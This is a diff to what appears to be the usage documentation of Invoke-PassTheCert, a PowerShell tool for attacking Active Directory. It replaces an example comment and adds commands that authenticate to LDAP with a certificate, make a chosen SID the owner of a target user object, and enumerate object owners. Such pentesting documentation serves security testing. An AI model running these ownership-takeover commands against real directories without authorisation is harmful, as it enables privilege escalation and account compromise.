@@ -45,8 +45,12 @@ Import-Module .\Invoke-PassTheCert.ps1
 $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
-# Add an object (e.g. WANHADELHEG$) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer (e.g. RBESEEDEE$)
-Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'controlled_principal_sid' -Target 'CN=Kinda KO. OWNED,CN=Users,DC=X'
+
+# Set the owner of 'Kinda KO. OWNED' user to the one with SID 'S-1-5-21-[...]-1103'. Hence, user with RID 1103 becomes the owner of 'Kinda KO. OWNED'.
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-5-21-[...]-1103' -Target 'CN=Kinda KO. OWNED,CN=Users,DC=X'
+
+# Get the owner of user 'John JD. DOE'
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'Owner' -Object 'CN=John JD. DOE,CN=Users,DC=X'
 ```
 
 :::
